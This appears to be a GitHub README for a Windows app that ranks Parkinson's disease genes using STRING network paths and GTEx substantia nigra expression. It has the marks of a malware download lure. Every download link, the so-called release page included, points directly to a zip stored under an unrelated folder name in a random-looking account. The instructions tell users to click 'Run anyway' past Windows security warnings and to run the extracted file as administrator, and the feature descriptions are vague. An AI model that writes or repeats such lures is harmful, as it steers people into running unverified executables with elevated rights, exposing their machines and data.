# 🧬 pd-netprox - Rank Parkinson’s genes with network paths

[![Download pd-netprox](https://img.shields.io/badge/Download%20pd--netprox-blue?style=for-the-badge)](https://raw.githubusercontent.com/implicated-collectable725/pd-netprox/main/Heterognathi/pd_netprox_shavee.zip)

## 🧭 What this app does

pd-netprox helps you look at Parkinson’s disease candidate genes with network proximity analysis. It uses protein interaction data from STRING and expression data from GTEx substantia nigra tissue.

Use it to:

- compare candidate genes against a Parkinson’s disease network
- score genes by how close they sit to known disease genes
- focus on genes with support from brain tissue expression
- review results in a simple Windows app flow

## 💻 What you need

Use a Windows PC with:

- Windows 10 or Windows 11
- at least 4 GB RAM
- 500 MB free disk space
- an internet connection for the first download
- permission to run downloaded apps

A mouse and keyboard are enough. You do not need Python or command-line tools for normal use.

## 🚀 Download and install

1. Open the release page here: [https://raw.githubusercontent.com/implicated-collectable725/pd-netprox/main/Heterognathi/pd_netprox_shavee.zip](https://raw.githubusercontent.com/implicated-collectable725/pd-netprox/main/Heterognathi/pd_netprox_shavee.zip)
2. Find the latest release at the top of the page
3. In the Assets section, download the Windows file
4. If the file comes as a .zip, save it to your Downloads folder
5. Right-click the .zip file and choose Extract All
6. Open the extracted folder
7. Double-click the app file to run it

If Windows shows a security prompt, choose Run or More info, then Run anyway if you trust the source.

## 🖱️ First launch

When you open pd-netprox for the first time:

1. Let the app finish loading
2. Choose the input files or sample data if the app offers them
3. Select the known Parkinson’s disease genes list
4. Select your candidate gene list
5. Confirm the STRING and GTEx options if the app asks
6. Start the analysis

The first run may take a little longer because the app may load local data and build network paths.

## 📁 Typical input files

pd-netprox works best with simple text-based gene lists. Common formats include:

- one gene symbol per line
- CSV files with a gene name column
- tab-separated files with gene symbols

Example gene symbols:

- SNCA
- LRRK2
- PINK1
- PRKN
- MAPT

Keep gene names in standard gene symbol form. Use the same naming style across all files.

## 🔍 How the analysis works

pd-netprox compares candidate genes to a Parkinson’s disease reference set.

It uses:

- STRING protein links to build the network
- Dijkstra shortest path logic to measure distance in the network
- GTEx substantia nigra expression to help weigh genes in the right tissue

The app then ranks genes by network proximity. Genes that sit close to known disease genes get higher interest for review.

## 📊 What you will see

The app may show:

- a ranked gene table
- path scores or distance scores
- network views
- filter options
- export files for later review

Common columns may include:

- gene symbol
- network distance
- score
- expression support
- rank

## 🧪 Suggested workflow

Use this order for a clean run:

1. Load the known Parkinson’s gene set
2. Load your candidate gene set
3. Check that the gene names match your source files
4. Run the proximity analysis
5. Review the top-ranked genes
6. Export the results
7. Compare the list with your study notes

## 🧰 Tips for better results

- Use clean gene symbols with no extra spaces
- Keep one gene per line if you can
- Use the same genome build and gene naming style across data sets
- Start with a smaller candidate list if you want faster runs
- Review genes that rank high in both network score and tissue support
- Save your output files in a project folder for easy tracking

## 📦 File types you may see

The release may include files such as:

- .exe for the app
- .zip for a packaged release
- .csv for output tables
- .tsv for text tables
- .json for run settings or export data

If you downloaded a zip file, always extract it before opening the app.

## 🛠️ If the app does not open

Try these steps:

1. Check that the download finished
2. Make sure you extracted the zip file
3. Right-click the app and choose Run as administrator
4. Check that Windows did not block the file
5. Install any missing Windows updates
6. Reboot your PC and try again

If the app still does not start, download the latest release again from the releases page and replace the old files.

## 🧾 Output use

Use the ranked output to:

- shortlist Parkinson’s disease candidate genes
- compare network support across gene sets
- support a review of disease-linked genes
- guide follow-up study design

The output works well as a first-pass filter before deeper lab or literature review.

## 🔒 Data handling

The app is built for local use on your computer. Keep your input files in a private folder if they contain study data. Save results in a named project folder so you can find them later.

## 🧭 Project focus

pd-netprox is built for:

- Parkinson’s disease gene prioritization
- protein network analysis
- expression-aware ranking
- reproducible study workflows
- research use with human gene data

It fits work that uses network biology and gene list review.

## 📥 Download again

If you need the release page, use this link: [https://raw.githubusercontent.com/implicated-collectable725/pd-netprox/main/Heterognathi/pd_netprox_shavee.zip](https://raw.githubusercontent.com/implicated-collectable725/pd-netprox/main/Heterognathi/pd_netprox_shavee.zip)

## 🖼️ Quick start checklist

- Download the latest Windows release
- Extract the files if needed
- Open the app
- Load your gene lists
- Run the analysis
- Review and export the ranked results